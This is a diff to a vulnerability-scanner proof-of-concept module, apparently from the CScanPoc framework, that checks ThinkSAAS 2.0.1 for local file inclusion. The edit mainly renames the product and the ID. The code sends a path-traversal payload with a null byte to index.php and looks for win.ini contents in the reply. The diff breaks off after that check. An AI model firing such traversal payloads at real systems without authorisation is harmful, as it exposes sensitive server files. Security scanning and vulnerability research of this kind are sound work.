@@ -3,18 +3,18 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'ThinkSaas_0101' # 平台漏洞编号
-    name = 'ThinkSaas 2.0.1 版文件包含' # 漏洞名称
+    vuln_id = 'ThinkSAAS_0102' # 平台漏洞编号
+    name = 'ThinkSAAS 2.0.1 版文件包含' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.LFI # 漏洞类型
     disclosure_date = '2014-03-09'  # 漏洞公布时间
     desc = '''模版漏洞描述
-    ThinkSaas 2.0.1 版文件包含漏洞，攻击者可以通过本地文件包含来读取系统敏感文件信息。
+    ThinkSAAS 2.0.1 版文件包含漏洞，攻击者可以通过本地文件包含来读取系统敏感文件信息。
     ''' # 漏洞描述
     ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=45409
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = 'ThinkSaas'  # 漏洞组件名称
+    product = 'ThinkSAAS'  # 漏洞组件名称
     product_version = '2.0.1'  # 漏洞应用版本
 
 class Poc(ABPoc):
@@ -29,7 +29,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            payload = "/thinksaas/index.php?app=../../../../../../../../../../windows/win.ini%00.jpg"
+            payload = "/ThinkSAAS/index.php?app=../../../../../../../../../../windows/win.ini%00.jpg"
             url = self.target + payload
             response = requests.get(url)
             if response.status_code==200 and "[extensions]" in response.text:
